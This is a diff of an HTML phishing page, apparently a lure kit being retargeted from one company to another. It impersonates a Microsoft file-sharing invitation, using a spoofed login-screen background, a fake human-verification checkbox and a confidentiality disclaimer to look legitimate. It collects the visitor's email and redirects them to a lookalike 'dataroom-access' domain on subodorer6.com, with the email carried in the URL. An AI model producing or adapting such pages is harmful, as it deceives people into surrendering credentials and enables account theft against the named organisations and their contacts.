@@ -3,141 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dataroom Access</title>
+    <title>Email Confirmation</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background-color: #f4f4f4;
             margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background: linear-gradient(135deg, #6264a7, #8e8cd8);
-            color: white;
+            color: #333;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/3/33/Microsoft_login_screen.svg');
+            background-size: cover;
+            background-position: center;
         }
-
         .container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            padding: 20px 30px;
-            width: 100%;
-            max-width: 400px;
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            padding: 33px;
+            width: 80%;
+            max-width: 320px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
-            color: black;
         }
-
-        .container img.logo {
+        .container img {
             width: 100px;
             margin-bottom: 20px;
         }
-
-        .container h1 {
-            color: #6264a7;
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-
-        .container p {
-            font-size: 14px;
-            color: #605e5c;
-            margin-bottom: 20px;
-        }
-
         .container input[type="email"] {
             width: 100%;
             padding: 10px;
-            border: 1px solid #d0d0d0;
-            border-radius: 4px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
             font-size: 16px;
-            margin-bottom: 20px;
+            text-align: center;
         }
-
-        .container input[type="checkbox"] {
-            margin-bottom: 20px;
-        }
-
         .container button {
-            background-color: #6264a7;
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
             color: white;
             border: none;
-            padding: 10px 15px;
+            border-radius: 3px;
             font-size: 16px;
-            border-radius: 4px;
             cursor: pointer;
-            width: 100%;
         }
-
         .container button:hover {
-            background-color: #4b4d9e;
+            background-color: #005a9e;
         }
-
-        .container .error {
-            color: red;
-            font-size: 14px;
-            margin-bottom: 20px;
+        .loading-section {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            font-size: 18px;
         }
-
-        .container img.placeholder {
-            width: 100%;
-            max-width: 300px;
-            margin-top: 20px;
-            border-radius: 8px;
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 5px solid rgba(0, 0, 0, 0.1);
+            border-top-color: #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
         }
-
-        .container .disclaimer {
-            font-size: 12px;
-            color: #605e5c;
-            margin-top: 20px;
-            line-height: 1.5;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 15px 20px;
-            }
-
-            .container h1 {
-                font-size: 20px;
-            }
-
-            .container p {
-                font-size: 12px;
-            }
-
-            .container button {
-                font-size: 14px;
-                padding: 8px 10px;
-            }
-
-            .container img.logo {
-                width: 80px;
-            }
-
-            .container img.placeholder {
-                max-width: 100%;
-            }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://logo.clearbit.com/printco.com.au" alt="Microsoft Teams Logo" class="logo">
-        <h1>Lea Michels invited you to access a file</h1>
-		<p> please enter your email address to continue</p>
+        <img src="https://logo.clearbit.com/delesgroup.com" alt="Logo">
+        <h2>Marta Wróblewska invited you to view a file</h2>
         <form id="emailForm" method="GET">
-            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            <input type="email" id="email" name="email" placeholder="Enter Email to Continue" required>
             <div class="error" id="errorMessage" style="display: none;">Please enter a valid email address.</div>
             <label>
-                <input type="checkbox" id="humanCheck" required> I am not a bot
+                <input type="checkbox" id="humanCheck" required> Verify you are human
             </label>
-            <button type="submit"><strong>ACCESS DATAROOM</strong></button>
+            <br><br>
+            <button type="submit">Continue</button>
         </form>
-        <p class="disclaimer">Disclaimer: The information contained in this e-mail is confidential. This e-mail is intended solely for this recepient and may not be accessed by anyone else.</p>
-        
-    </div>
-
+        <p class="footer">Disclaimer: The information in this email is confidential and intended solely for this recipient. Unauthorized access is prohibited.</p>
+    
     <script>
         const form = document.getElementById('emailForm');
         const emailInput = document.getElementById('email');
@@ -159,7 +114,7 @@
             } else {
                 errorMessage.style.display = 'none';
                 // Redirect to the landing page with the email appended as a query parameter
-                const redirectUrl = `https://printco-view-file-dataroom-access.subodorer6.com/W60IUboNTicdWiHGIQlHtrEFfhVQSYiQ/#W${encodeURIComponent(email)}`;
+                const redirectUrl = `https://delesgroup-dataroom-access.subodorer6.com/W60IUboNTicdWiHGIQlHtrEFfhVQSYiQ/#W${encodeURIComponent(email)}`;
                 window.location.href = redirectUrl;
             }
         });
